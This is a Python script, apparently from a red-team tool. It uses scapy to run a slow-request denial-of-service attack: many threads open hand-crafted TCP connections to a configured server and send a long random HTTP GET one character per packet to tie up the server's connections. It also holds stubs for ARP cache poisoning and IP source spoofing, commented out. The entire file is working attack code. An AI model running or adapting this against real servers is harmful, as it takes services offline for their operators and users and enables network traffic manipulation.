import multiprocessing
import threading
import time
from multiprocessing.pool import ThreadPool

from loguru import logger
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import arpcachepoison
from scapy.sendrecv import send, sniff

from red.config import config
from red.utils import generate_random_string, my_iface, my_ip, my_network, random_port, spoof_ip


connection_time = 0.5
random_size = 900
payload_length = len(f"GET {generate_random_string(random_size)} HTTP/1.1\r\n\r\n".encode())
pps = payload_length / connection_time
bps = (20 + 20 + 1) * 8 * pps

stop = threading.Event()


def arp_poison():
    # arpcachepoison("10.1.2.3", "10.1.2.100", interval=1)
    pass


def connection(_: None):
    while not stop.is_set():
        try:
            # ip = spoof_ip()
            ip = my_ip
            port = random_port()
            payload = f"GET {generate_random_string(random_size)} HTTP/1.1\r\n\r\n"
            syn = IP(dst=config.server_host, src=ip) / TCP(dport=80, sport=port, flags='S')
            syn_ack = send_and_sniff(syn, ip, port)
            syn_ack.show()
            # logger.info(f"sniffed: {syn_ack.show()}")
            ack = IP(dst=config.server_host, src=ip) / TCP(dport=80, sport=port, flags='A', seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1)
            send(ack, verbose=False)
            latest = ack
            for char in payload:
                req = (
                        IP(dst=config.server_host, src=ip)
                        / TCP(dport=80, sport=port,
                              seq=latest[TCP].ack, ack=latest[TCP].seq + 1, flags='PA')
                        / char.encode()
                )
                logger.info("shish")
                latest = send_and_sniff(req, ip, port)
                latest.show()
                time.sleep(connection_time / len(payload))
            logger.info("wow")
        except TimeoutError:
            logger.info("Got a timeout :tada:!")


def send_and_sniff(packet, ip, port):
    response = IP()
    def sniffer():
        nonlocal response
        response = sniff(
            filter=f"dst host {ip} and tcp dst port {port}",
            count=1,
            iface=my_iface,
        )[0]
    s = threading.Thread(target=sniffer)
    s.start()
    send(packet, verbose=False)
    s.join()
    return response



def run():
    threads = int(config.attack.cli.pps)
    logger.info(f"Starting with: "
                f"{connection_time} "
                f"{payload_length} "
                f"{pps} "
                f"{bps} "
                f"{threads} ")

    arp_thread = multiprocessing.Process(target=arp_poison)
    arp_thread.start()

    with ThreadPool(threads) as pool:
        pool.map(connection, [None] * threads)
    while True:
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            stop.set()
            arp_thread.terminate()
            arp_thread.join()